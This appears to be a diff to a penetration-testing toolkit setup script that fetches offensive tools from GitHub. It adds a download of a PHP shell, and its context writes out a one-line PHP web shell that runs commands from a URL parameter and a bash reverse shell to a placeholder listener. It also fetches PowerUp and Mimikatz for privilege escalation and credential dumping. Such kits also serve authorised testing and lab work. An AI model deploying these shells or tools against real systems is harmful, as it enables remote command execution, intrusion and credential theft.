@@ -82,6 +82,7 @@ wget https://raw.githubusercontent.com/h1dz/Cyber/Scripts/masscan.sh; chmod +x m
 wget https://raw.githubusercontent.com/h1dz/Cyber/Scripts/vhosts.sh; chmod +x vhosts.sh
 wget https://raw.githubusercontent.com/h1dz/Cyber/Scripts/ping.sh; chmod +x ping.sh
 wget https://raw.githubusercontent.com/h1dz/Cyber/Scripts/gobuster.sh; chmod +x gobuster.sh; mv gobuster.sh go.sh
+wget https://raw.githubusercontent.com/h1dz/Cyber/Scripts/phpshell.php
 cat << EOF > /$HOME/home/webshell.php
 <?PHP system($_GET['cmd']); ?>
 EOF
@@ -89,7 +90,6 @@ cat << EOF > /$HOME/home/bashshell.sh
 /bin/bash -c '/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
 chmod +x bashshell.sh
 EOF
-#add phpshell.php to github
 cd /$HOME/Tools/windows/
 sudo wget https://raw.githubusercontent.com/h1dz/Windows-Tools/master/powerup.ps1 -O powerup.ps1
 sudo wget https://github.com/h1dz/Windows-Tools/raw/master/mimikatz.exe -O mimikatz.exe
